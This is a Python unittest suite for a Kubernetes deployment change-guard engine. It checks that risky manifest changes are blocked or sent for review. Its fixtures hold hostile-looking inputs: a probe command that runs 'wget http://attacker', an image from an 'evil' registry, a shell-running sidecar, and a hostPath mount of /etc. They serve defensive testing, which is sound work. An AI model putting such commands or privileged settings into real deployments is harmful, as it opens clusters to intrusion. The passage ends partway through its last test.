"""Substantive engine risk and boundary tests (unittest, no cluster)."""

from __future__ import annotations

import json
import math
import unittest

from change_guard.engine import RULE_VERSION, evaluate
from test_core_support import (
    DIGEST,
    MI,
    NEW_DIGEST,
    NOW,
    REPOSITORY,
    ai_ok,
    base_config,
    base_context,
    base_deployment,
    base_evidence,
    base_resources,
    base_service,
    clone,
)


def rule_ids(result: dict) -> set[str]:
    return {finding["rule_id"] for finding in result["findings"]}


class PassPathTests(unittest.TestCase):
    def test_happy_path_schema_digest_and_expiry(self) -> None:
        old = base_resources()
        new = base_resources()
        result = evaluate(old, new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")
        self.assertEqual(result["findings"], [])
        self.assertEqual(result["rule_version"], RULE_VERSION)
        self.assertEqual(len(result["render_digest"]), 64)
        self.assertEqual(result["render_digest"], result["old_render_digest"])
        self.assertGreaterEqual(result["expires_at"], NOW + 290)
        self.assertLessEqual(result["expires_at"], NOW + 300)
        self.assertEqual(result["changes"], [])
        self.assertFalse(result["context"]["pod_template_changed"])
        self.assertEqual(result["audit"]["schema_version"], "1.0")
        json.dumps(result, allow_nan=False)

    def test_rendered_field_diff_detects_template_change_not_values(self) -> None:
        old = base_resources()
        new = clone(old)
        new[0]["spec"]["template"]["metadata"]["annotations"]["demo/version"] = "changed"
        result = evaluate(old, new, base_evidence(), base_config(), base_context())
        self.assertTrue(result["context"]["pod_template_changed"])
        self.assertTrue(any("spec.template.metadata.annotations.demo/version" in c["path"] for c in result["changes"]))
        self.assertEqual(result["decision"], "PASS")
        self.assertNotIn("values", json.dumps(result["changes"]).lower())

    def test_render_digest_is_order_independent(self) -> None:
        new = base_resources()
        evidence = base_evidence()
        a = evaluate(base_resources(), new, evidence, base_config(), base_context())
        b = evaluate(base_resources(), list(reversed(new)), evidence, base_config(), base_context())
        self.assertEqual(a["render_digest"], b["render_digest"])
        self.assertEqual(a["decision"], b["decision"])

    def test_chart_template_file_change_requires_review(self) -> None:
        context = base_context(tree_changes=["charts/demo/templates/deployment.yaml"])
        result = evaluate(base_resources(), base_resources(), base_evidence(), base_config(), context)
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("TEMPLATE_FILE_CHANGE", rule_ids(result))


class ImageAndEnvironmentTests(unittest.TestCase):
    def test_digest_and_repository_rules(self) -> None:
        cases = {
            "missing digest": (f"{REPOSITORY}:sha-c0bff8ab", "IMAGE_DIGEST_REQUIRED"),
            "wrong repo": (f"ghcr.io/evil/demo@sha256:{'c' * 64}", "IMAGE_REPOSITORY_NOT_ALLOWED"),
            "invalid digest": (f"{REPOSITORY}@sha256:abc", "IMAGE_DIGEST_INVALID"),
            "latest tag": (f"{REPOSITORY}:latest", "IMAGE_MUTABLE_TAG"),
        }
        for name, (image, expected) in cases.items():
            with self.subTest(name=name):
                new = clone(base_resources())
                new[0]["spec"]["template"]["spec"]["containers"][0]["image"] = image
                result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
                self.assertEqual(result["decision"], "BLOCK")
                self.assertIn(expected, rule_ids(result))

    def test_valid_digest_change_is_allowed_but_diff_is_recorded(self) -> None:
        new = clone(base_resources())
        new[0]["spec"]["template"]["spec"]["containers"][0]["image"] = f"{REPOSITORY}@{NEW_DIGEST}"
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")
        self.assertTrue(any("containers[0].image" in c["path"] for c in result["changes"]))

    def test_duplicate_env_blocks(self) -> None:
        new = clone(base_resources())
        env = new[0]["spec"]["template"]["spec"]["containers"][0]["env"]
        env.append({"name": "APP_VERSION", "value": "duplicate"})
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("DUPLICATE_ENV", rule_ids(result))
        self.assertIn("first_index", next(f for f in result["findings"] if f["rule_id"] == "DUPLICATE_ENV")["evidence"])

    def test_duplicate_env_between_base_and_extra_style_entries_blocks(self) -> None:
        new = clone(base_resources())
        env = new[0]["spec"]["template"]["spec"]["containers"][0]["env"]
        env.append({"name": "GIT_SHA", "value": "other"})
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("DUPLICATE_ENV", rule_ids(result))

    def test_fault_literals_and_valuefrom_block(self) -> None:
        cases = {
            "error rate": ({"name": "DEMO_ERROR_RATE", "value": "0.5"}, "FAULT_INJECTION"),
            "latency": ({"name": "DEMO_LATENCY_MS", "value": "3000"}, "FAULT_INJECTION"),
            "startup": ({"name": "DEMO_STARTUP_FAIL", "value": "true"}, "FAULT_INJECTION"),
            "valueFrom": (
                {
                    "name": "DEMO_ERROR_RATE",
                    "valueFrom": {"configMapKeyRef": {"name": "faults", "key": "rate"}},
                },
                "FAULT_VALUE_FROM",
            ),
            "invalid fault value": ({"name": "DEMO_LATENCY_MS", "value": "soon"}, "FAULT_ENV_INVALID"),
        }
        for name, (entry, expected) in cases.items():
            with self.subTest(name=name):
                new = clone(base_resources())
                env = new[0]["spec"]["template"]["spec"]["containers"][0]["env"]
                env[:] = [item for item in env if item["name"] != entry["name"]]
                env.append(entry)
                result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
                self.assertEqual(result["decision"], "BLOCK")
                self.assertIn(expected, rule_ids(result))

    def test_safe_zero_fault_values_are_not_blocked(self) -> None:
        result = evaluate(base_resources(), base_resources(), base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")


class DeploymentShapeTests(unittest.TestCase):
    def test_deleting_deployment_blocks(self) -> None:
        new = [base_service()]
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("DEPLOYMENT_MISSING", rule_ids(result))
        self.assertTrue(any(c["operation"] == "remove" and c["kind"] == "Deployment" for c in result["changes"]))

    def test_zero_replicas_blocks(self) -> None:
        new = clone(base_resources())
        new[0]["spec"]["replicas"] = 0
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("REPLICAS_ZERO", rule_ids(result))

    def test_service_exposure_and_removal(self) -> None:
        nodeport = clone(base_resources())
        nodeport[1]["spec"]["type"] = "NodePort"
        result = evaluate(base_resources(), nodeport, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("SERVICE_EXPOSURE", rule_ids(result))

        removed = [base_deployment()]
        result = evaluate(base_resources(), removed, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("SERVICE_REMOVED", rule_ids(result))

    def test_readiness_liveness_and_probe_shape(self) -> None:
        missing_readiness = clone(base_resources())
        del missing_readiness[0]["spec"]["template"]["spec"]["containers"][0]["readinessProbe"]
        result = evaluate(base_resources(), missing_readiness, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("PROBE_MISSING", rule_ids(result))

        missing_liveness = clone(base_resources())
        del missing_liveness[0]["spec"]["template"]["spec"]["containers"][0]["livenessProbe"]
        result = evaluate(base_resources(), missing_liveness, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("PROBE_MISSING", rule_ids(result))

        bad_probe = clone(base_resources())
        bad_probe[0]["spec"]["template"]["spec"]["containers"][0]["readinessProbe"]["httpGet"]["port"] = 0
        result = evaluate(base_resources(), bad_probe, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("PROBE_INVALID", rule_ids(result))

        no_startup = clone(base_resources())
        del no_startup[0]["spec"]["template"]["spec"]["containers"][0]["startupProbe"]
        result = evaluate(base_resources(), no_startup, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("PROBE_MISSING", rule_ids(result))


class SecurityTests(unittest.TestCase):
    def test_privilege_host_and_root_hardening_blocks(self) -> None:
        manipulations = {
            "privileged": lambda r: r[0]["spec"]["template"]["spec"]["containers"][0]["securityContext"].update(
                {"privileged": True}
            ),
            "privilege escalation": lambda r: r[0]["spec"]["template"]["spec"]["containers"][0]["securityContext"].update(
                {"allowPrivilegeEscalation": True}
            ),
            "run as root": lambda r: r[0]["spec"]["template"]["spec"]["containers"][0]["securityContext"].update(
                {"runAsUser": 0}
            ),
            "nonroot disabled": lambda r: (
                r[0]["spec"]["template"]["spec"]["securityContext"].update({"runAsNonRoot": False}),
                r[0]["spec"]["template"]["spec"]["containers"][0]["securityContext"].update({"runAsNonRoot": False}),
            ),
            "host network": lambda r: r[0]["spec"]["template"]["spec"].update({"hostNetwork": True}),
            "host path": lambda r: r[0]["spec"]["template"]["spec"]["volumes"].append(
                {"name": "host", "hostPath": {"path": "/etc"}}
            ),
            "added capability": lambda r: r[0]["spec"]["template"]["spec"]["containers"][0]["securityContext"][
                "capabilities"
            ].update({"add": ["NET_ADMIN"]}),
        }
        for name, mutate in manipulations.items():
            with self.subTest(name=name):
                new = clone(base_resources())
                mutate(new)
                result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
                self.assertEqual(result["decision"], "BLOCK")
                self.assertTrue(
                    {
                        "PRIVILEGED_CONTAINER",
                        "PRIVILEGE_ESCALATION_ALLOWED",
                        "RUN_AS_ROOT",
                        "RUN_AS_NONROOT_REQUIRED",
                        "POD_HOST_NAMESPACE",
                        "HOST_PATH_VOLUME",
                        "CAPABILITIES_ADDED",
                    }
                    & rule_ids(result)
                )

    def test_writable_root_is_review_not_block(self) -> None:
        new = clone(base_resources())
        new[0]["spec"]["template"]["spec"]["containers"][0]["securityContext"]["readOnlyRootFilesystem"] = False
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("ROOT_FILESYSTEM_WRITABLE", rule_ids(result))

    def test_seccomp_unconfined_blocks(self) -> None:
        new = clone(base_resources())
        new[0]["spec"]["template"]["spec"]["securityContext"]["seccompProfile"] = {"type": "Unconfined"}
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("SECCOMP_UNCONFINED", rule_ids(result))


class MemoryAndResourceTests(unittest.TestCase):
    def test_memory_limit_below_15m_headroom_blocks(self) -> None:
        evidence = base_evidence(memory=170 * MI)
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        finding = next(f for f in result["findings"] if f["rule_id"] == "MEMORY_LIMIT_TOO_LOW")
        self.assertLess(finding["evidence"]["memory_limit_bytes"], finding["evidence"]["required_at_least_bytes"])

    def test_memory_limit_exactly_at_threshold_passes(self) -> None:
        evidence = base_evidence(memory=(192 * MI) / 1.25)
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")

    def test_missing_memory_limit_is_error_when_metric_exists(self) -> None:
        new = clone(base_resources())
        del new[0]["spec"]["template"]["spec"]["containers"][0]["resources"]["limits"]["memory"]
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "ERROR")
        self.assertIn("MEMORY_LIMIT_MISSING", rule_ids(result))

    def test_more_than_half_resource_reduction_reviews(self) -> None:
        old = clone(base_resources())
        old[0]["spec"]["template"]["spec"]["containers"][0]["resources"]["requests"] = {
            "cpu": "200m",
            "memory": "128Mi",
        }
        old[0]["spec"]["template"]["spec"]["containers"][0]["resources"]["limits"] = {
            "cpu": "500m",
            "memory": "512Mi",
        }
        result = evaluate(old, base_resources(), base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("RESOURCE_REDUCTION", rule_ids(result))

    def test_resource_limit_below_request_blocks(self) -> None:
        new = clone(base_resources())
        new[0]["spec"]["template"]["spec"]["containers"][0]["resources"]["limits"]["cpu"] = "25m"
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("RESOURCE_LIMIT_BELOW_REQUEST", rule_ids(result))


class EvidenceMetricTests(unittest.TestCase):
    def test_missing_stale_nonfinite_and_missing_timestamp_metrics_error(self) -> None:
        def missing_memory():
            evidence = base_evidence()
            evidence["metrics"]["memory_working_set_bytes"] = None
            return evidence

        def nan_rate():
            evidence = base_evidence()
            evidence["metrics"]["request_rate"] = "NaN"
            return evidence

        def inf_memory():
            evidence = base_evidence()
            evidence["metrics"]["memory_working_set_bytes"] = float("inf")
            return evidence

        def stale_collection():
            return base_evidence(collected_at=NOW - 400)

        def stale_sample():
            return base_evidence(timestamps={"memory_working_set_bytes": NOW - 400})

        def missing_timestamp():
            evidence = base_evidence()
            del evidence["metrics"]["source_timestamps"]["memory_working_set_bytes"]
            return evidence

        def bad_error_ratio():
            evidence = base_evidence()
            evidence["metrics"]["error_ratio"] = 1.2
            return evidence

        def missing_p95_high_traffic():
            evidence = base_evidence(p95=None)
            return evidence

        cases = {
            "missing memory": (missing_memory, "METRIC_MISSING_OR_INVALID"),
            "nan rate": (nan_rate, "METRIC_MISSING_OR_INVALID"),
            "inf memory": (inf_memory, "METRIC_MISSING_OR_INVALID"),
            "stale collection": (stale_collection, "EVIDENCE_STALE"),
            "stale sample": (stale_sample, "METRIC_STALE"),
            "missing timestamp": (missing_timestamp, "METRIC_TIMESTAMP_MISSING"),
            "bad error ratio": (bad_error_ratio, "METRIC_MISSING_OR_INVALID"),
            "missing p95": (missing_p95_high_traffic, "METRIC_MISSING_OR_INVALID"),
        }
        for name, (factory, expected) in cases.items():
            with self.subTest(name=name):
                result = evaluate(
                    base_resources(), base_resources(), factory(), base_config(), base_context()
                )
                self.assertEqual(result["decision"], "ERROR")
                self.assertIn(expected, rule_ids(result))

    def test_collector_errors_force_error(self) -> None:
        evidence = base_evidence(errors=["prometheus query failed: timeout"])
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "ERROR")
        self.assertIn("EVIDENCE_ERROR", rule_ids(result))

    def test_low_traffic_reviews_and_does_not_assume_zero_health(self) -> None:
        for rate in (0.0, 0.05, 0.099):
            with self.subTest(rate=rate):
                evidence = base_evidence(request_rate=rate, error_ratio=None, p95=None)
                result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
                self.assertEqual(result["decision"], "REVIEW")
                self.assertIn("LOW_TRAFFIC", rule_ids(result))
                self.assertNotIn("METRIC_MISSING_OR_INVALID", rule_ids(result))

    def test_high_error_latency_and_firing_alert_review(self) -> None:
        evidence = base_evidence(
            error_ratio=0.2,
            p95=1.2,
            alerts=[
                {
                    "name": "DemoHighErrorRate",
                    "state": "firing",
                    "labels": {"namespace": "demo", "deployment": "demo"},
                }
            ],
        )
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertTrue({"HIGH_ERROR_RATIO", "HIGH_P95_LATENCY", "FIRING_ALERTS"} <= rule_ids(result))

    def test_unrelated_firing_alert_is_ignored(self) -> None:
        evidence = base_evidence(
            alerts=[{"name": "Other", "state": "firing", "labels": {"namespace": "other"}}]
        )
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")


class CapacityTests(unittest.TestCase):
    def test_single_worker_rolling_capacity_accounts_for_surge(self) -> None:
        evidence = base_evidence(available_cpu_millicores=49, available_memory_bytes=4096 * MI)
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("CAPACITY_INSUFFICIENT", rule_ids(result))
        audit = result["audit"]["capacity"]
        self.assertEqual(audit["additional_pods_reserved"], 1)
        self.assertEqual(audit["peak_total_pods"], 2)
        self.assertEqual(audit["retained_old_replicas"], 1)
        self.assertEqual(audit["surge_pods"], 1)

    def test_exact_capacity_boundary_passes(self) -> None:
        evidence = base_evidence(available_cpu_millicores=50, available_memory_bytes=64 * MI)
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertNotIn("CAPACITY_INSUFFICIENT", rule_ids(result))

    def test_capacity_uses_nodes_pods_init_max_and_overhead(self) -> None:
        evidence = base_evidence()
        evidence["capacity"] = {}
        evidence["nodes"] = [
            {
                "name": "worker-1",
                "ready": True,
                "control_plane": False,
                "schedulable": True,
                "allocatable_cpu_millicores": 1000,
                "allocatable_memory_bytes": 1024 * MI,
            }
        ]
        old_pod = {
            "name": "demo-old",
            "phase": "Running",
            "node": "worker-1",
            "spec": {
                "containers": [
                    {
                        "name": "demo",
                        "resources": {
                            "requests": {"cpu": "100m", "memory": "256Mi"},
                            "limits": {"cpu": "250m", "memory": "512Mi"},
                        },
                    }
                ],
                "initContainers": [
                    {
                        "name": "init",
                        "resources": {"requests": {"cpu": "700m", "memory": "64Mi"}},
                    }
                ],
                "overhead": {"cpu": "100m", "memory": "16Mi"},
            },
        }
        evidence["pods"] = [old_pod]
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        audit = result["audit"]["capacity"]
        self.assertEqual(audit["source"], "nodes+pods")
        self.assertAlmostEqual(audit["existing_pods_requests_cpu_millicores"], 800.0)
        self.assertAlmostEqual(audit["available_cpu_millicores"], 200.0)
        self.assertNotIn("CAPACITY_INSUFFICIENT", rule_ids(result))

        evidence["pods"].append(
            {
                "name": "other",
                "phase": "Running",
                "node": "worker-1",
                "spec": {
                    "containers": [
                        {
                            "name": "other",
                            "resources": {"requests": {"cpu": "150m", "memory": "64Mi"}},
                        }
                    ]
                },
            }
        )
        evidence["pods"].append(
            {
                "name": "other-2",
                "phase": "Running",
                "node": "worker-1",
                "spec": {
                    "containers": [
                        {
                            "name": "other-2",
                            "resources": {"requests": {"cpu": "50m", "memory": "64Mi"}},
                        }
                    ]
                },
            }
        )
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("CAPACITY_INSUFFICIENT", rule_ids(result))

    def test_no_schedulable_worker_reviews(self) -> None:
        evidence = base_evidence(available_cpu_millicores=0, available_memory_bytes=0, workers_ready=0)
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("NO_SCHEDULABLE_WORKER", rule_ids(result))


class AiAndPriorityTests(unittest.TestCase):
    def test_ai_error_is_error_but_never_overrides_block(self) -> None:
        ai_error = {"status": "error", "model": "deepseek-chat", "summary": "", "additional_risks": [], "citations": [], "error": "timeout"}
        clean = evaluate(base_resources(), base_resources(), base_evidence(), base_config(ai_required=True), base_context(), ai_error)
        self.assertEqual(clean["decision"], "ERROR")
        self.assertIn("AI_UNAVAILABLE", rule_ids(clean))

        bad = clone(base_resources())
        env = bad[0]["spec"]["template"]["spec"]["containers"][0]["env"]
        env.append({"name": "DEMO_ERROR_RATE", "value": "1"})
        blocked = evaluate(base_resources(), bad, base_evidence(), base_config(ai_required=True), base_context(), ai_error)
        self.assertEqual(blocked["decision"], "BLOCK")
        self.assertIn("FAULT_INJECTION", rule_ids(blocked))
        self.assertIn("AI_UNAVAILABLE", rule_ids(blocked))

    def test_ai_risk_only_reviews(self) -> None:
        ai_result = ai_ok(risks=[{"title": "Possible proxy outage", "detail": "The repo proxy is outside this release scope."}])
        result = evaluate(
            base_resources(), base_resources(), base_evidence(), base_config(ai_required=True), base_context(), ai_result
        )
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("AI_ADDITIONAL_RISK", rule_ids(result))
        self.assertNotEqual(result["decision"], "BLOCK")

    def test_ai_required_missing_or_invalid_is_error(self) -> None:
        result = evaluate(
            base_resources(), base_resources(), base_evidence(), base_config(ai_required=True), base_context(), None
        )
        self.assertEqual(result["decision"], "ERROR")
        self.assertIn("AI_REQUIRED_UNAVAILABLE", rule_ids(result))

        invalid = {"status": "ok", "model": "deepseek-chat", "summary": "ok", "additional_risks": "not a list", "citations": []}
        result = evaluate(
            base_resources(), base_resources(), base_evidence(), base_config(ai_required=True), base_context(), invalid
        )
        self.assertEqual(result["decision"], "ERROR")
        self.assertIn("AI_INVALID_RESULT", rule_ids(result))


class ScopeAndAuditTests(unittest.TestCase):
    def test_argocd_and_unexpected_resources(self) -> None:
        context = base_context(tree_changes=["gitops/argocd/application.yaml"])
        result = evaluate(base_resources(), base_resources(), base_evidence(), base_config(), context)
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("ARGOCD_MANIFEST_CHANGE", rule_ids(result))

        source_changed = base_context()
        source_changed["argo_source_changed"] = True
        result = evaluate(base_resources(), base_resources(), base_evidence(), base_config(), source_changed)
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("ARGOCD_SOURCE_CHANGED", rule_ids(result))

        cluster_role = {
            "apiVersion": "rbac.authorization.k8s.io/v1",
            "kind": "ClusterRole",
            "metadata": {"name": "evil"},
            "rules": [],
        }
        result = evaluate(
            base_resources(), base_resources() + [cluster_role], base_evidence(), base_config(), base_context()
        )
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("FORBIDDEN_RESOURCE_KIND", rule_ids(result))

        config_map = {"apiVersion": "v1", "kind": "ConfigMap", "metadata": {"name": "extra", "namespace": "demo"}, "data": {"a": "b"}}
        result = evaluate(
            base_resources(), base_resources() + [config_map], base_evidence(), base_config(), base_context()
        )
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("UNEXPECTED_RESOURCE", rule_ids(result))

    def test_additional_service_exposure_blocks(self) -> None:
        extra = {
            "apiVersion": "v1",
            "kind": "Service",
            "metadata": {"name": "other", "namespace": "demo"},
            "spec": {"type": "NodePort", "ports": [{"port": 80, "nodePort": 30080}]},
        }
        result = evaluate(
            base_resources(), base_resources() + [extra], base_evidence(), base_config(), base_context()
        )
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("SERVICE_EXPOSURE", rule_ids(result))
        self.assertIn("UNEXPECTED_RESOURCE", rule_ids(result))

    def test_env_value_is_redacted_in_change_audit(self) -> None:
        new = clone(base_resources())
        new[0]["spec"]["template"]["spec"]["containers"][0]["env"].append(
            {"name": "SOME_SECRET_VALUE", "value": "SUPERSECRETCHANGEVALUE"}
        )
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")
        self.assertNotIn("SUPERSECRETCHANGEVALUE", json.dumps(result))
        self.assertTrue(any(".env[" in change["path"] for change in result["changes"]))

    def test_structured_audit_and_finding_shape(self) -> None:
        new = clone(base_resources())
        new[0]["spec"]["replicas"] = 0
        new[0]["spec"]["template"]["spec"]["containers"][0]["env"].append(
            {"name": "DEMO_STARTUP_FAIL", "value": "true"}
        )
        result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        for finding in result["findings"]:
            self.assertEqual(set(finding), {"rule_id", "severity", "field", "message", "evidence"})
            self.assertIn(finding["severity"], {"BLOCK", "ERROR", "REVIEW"})
        self.assertEqual(result["audit"]["checks"][0]["severity"], "BLOCK")
        self.assertEqual(result["audit"]["rule_version"], RULE_VERSION)
        json.dumps(result, allow_nan=False)

    def test_expires_at_never_extends_stale_is_bounded_by_evidence(self) -> None:
        evidence = base_evidence(collected_at=NOW - 200, timestamps={k: NOW - 200 for k in base_evidence()["metrics"]["source_timestamps"]})
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")
        self.assertEqual(result["expires_at"], NOW + 100)

    def test_invalid_input_types_raise_fail_closed(self) -> None:
        with self.assertRaises(ValueError):
            evaluate({}, [], base_evidence(), base_config(), base_context())  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            evaluate([], [], "evidence", base_config(), base_context())  # type: ignore[arg-type]


class ContainerRestrictionTests(unittest.TestCase):
    def test_sidecar_and_init_container_block(self) -> None:
        sidecar = clone(base_resources())
        sidecar[0]["spec"]["template"]["spec"]["containers"].append(
            {
                "name": "evil-sidecar",
                "image": f"{REPOSITORY}@{DIGEST}",
                "command": ["/bin/sh", "-c", "id"],
                "resources": {"requests": {"cpu": "10m", "memory": "16Mi"}},
            }
        )
        result = evaluate(base_resources(), sidecar, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("CONTAINER_SET_NOT_ALLOWED", rule_ids(result))

        init = clone(base_resources())
        init[0]["spec"]["template"]["spec"]["initContainers"] = [
            {"name": "init", "image": f"{REPOSITORY}@{DIGEST}", "command": ["/bin/sh"]}
        ]
        result = evaluate(base_resources(), init, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("INIT_CONTAINER_NOT_ALLOWED", rule_ids(result))

    def test_command_args_and_lifecycle_block(self) -> None:
        for key, value in (
            ("command", ["/bin/sh", "-c"]),
            ("args", ["id"]),
            ("lifecycle", {"postStart": {"exec": {"command": ["id"]}}}),
            ("lifecycle", {"preStop": {"exec": {"command": ["id"]}}}),
        ):
            with self.subTest(key=key, value=value):
                new = clone(base_resources())
                new[0]["spec"]["template"]["spec"]["containers"][0][key] = value
                result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
                self.assertEqual(result["decision"], "BLOCK")
                self.assertTrue(
                    {"CONTAINER_COMMAND_NOT_ALLOWED", "LIFECYCLE_NOT_ALLOWED"} & rule_ids(result)
                )

    def test_exec_probe_allowlist(self) -> None:
        safe = clone(base_resources())
        safe[0]["spec"]["template"]["spec"]["containers"][0]["readinessProbe"] = {
            "exec": {"command": ["/bin/true"]},
            "periodSeconds": 5,
        }
        result = evaluate(base_resources(), safe, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")

        unsafe = clone(safe)
        unsafe[0]["spec"]["template"]["spec"]["containers"][0]["readinessProbe"]["exec"]["command"] = [
            "/bin/sh",
            "-c",
            "wget http://attacker",
        ]
        result = evaluate(base_resources(), unsafe, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("PROBE_EXEC_COMMAND_NOT_ALLOWED", rule_ids(result))

    def test_env_from_and_sensitive_volumes_block(self) -> None:
        env_from = clone(base_resources())
        container = env_from[0]["spec"]["template"]["spec"]["containers"][0]
        container["envFrom"] = [{"configMapRef": {"name": "faults"}}]
        result = evaluate(base_resources(), env_from, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("ENV_FROM_NOT_ALLOWED", rule_ids(result))

    def test_secret_projected_and_configmap_volumes_block(self) -> None:
        for source in ("secret", "projected", "configMap"):
            with self.subTest(source=source):
                new = clone(base_resources())
                new[0]["spec"]["template"]["spec"]["volumes"].append(
                    {"name": source + "-vol", source: {"name": "x"} if source != "projected" else {"sources": []}}
                )
                result = evaluate(base_resources(), new, base_evidence(), base_config(), base_context())
                self.assertEqual(result["decision"], "BLOCK")
                self.assertIn("SENSITIVE_VOLUME", rule_ids(result))


class SchedulingAndCapacityTests(unittest.TestCase):
    def test_control_plane_scheduling_blocks_and_unknown_reviews(self) -> None:
        control = clone(base_resources())
        control[0]["spec"]["template"]["spec"]["nodeSelector"] = {
            "node-role.kubernetes.io/control-plane": ""
        }
        result = evaluate(base_resources(), control, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("CONTROL_PLANE_SCHEDULING", rule_ids(result))

        unknown = clone(base_resources())
        unknown[0]["spec"]["template"]["spec"]["nodeSelector"] = {"disktype": "ssd"}
        result = evaluate(base_resources(), unknown, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("SCHEDULING_UNVERIFIED", rule_ids(result))

        toleration = clone(base_resources())
        toleration[0]["spec"]["template"]["spec"]["tolerations"] = [
            {"key": "node-role.kubernetes.io/control-plane", "operator": "Exists", "effect": "NoSchedule"}
        ]
        result = evaluate(base_resources(), toleration, base_evidence(), base_config(), base_context())
        self.assertEqual(result["decision"], "BLOCK")
        self.assertIn("CONTROL_PLANE_TOLERATION", rule_ids(result))

    def test_missing_scheduled_pod_requests_are_review_not_error(self) -> None:
        evidence = base_evidence()
        evidence["capacity"] = {}
        evidence["nodes"] = [
            {
                "name": "worker-1",
                "ready": True,
                "control_plane": False,
                "schedulable": True,
                "allocatable_cpu_millicores": 1000,
                "allocatable_memory_bytes": 1024 * MI,
            }
        ]
        evidence["pods"] = [
            {
                "name": "unreserved",
                "node": "worker-1",
                "phase": "Running",
                "spec": {"containers": [{"name": "x", "resources": {}}]},
            }
        ]
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("CAPACITY_POD_REQUESTS_UNRESERVED", rule_ids(result))
        self.assertNotIn("CAPACITY_POD_REQUESTS_MISSING", rule_ids(result))
        self.assertNotIn("ERROR", {f["severity"] for f in result["findings"]})

    def test_precomputed_capacity_still_records_unreserved_requests(self) -> None:
        evidence = base_evidence()
        evidence["nodes"] = [
            {
                "name": "worker-1",
                "ready": True,
                "control_plane": False,
                "schedulable": True,
                "allocatable_cpu_millicores": 1000,
                "allocatable_memory_bytes": 1024 * MI,
            }
        ]
        evidence["pods"] = [
            {
                "name": "unreserved",
                "node": "worker-1",
                "phase": "Running",
                "spec": {"containers": [{"name": "x", "resources": {"requests": {"cpu": None, "memory": None}}}]},
            }
        ]
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("CAPACITY_POD_REQUESTS_UNRESERVED", rule_ids(result))
        self.assertNotIn("ERROR", {f["severity"] for f in result["findings"]})

    def test_old_plus_surge_peak_is_reserved(self) -> None:
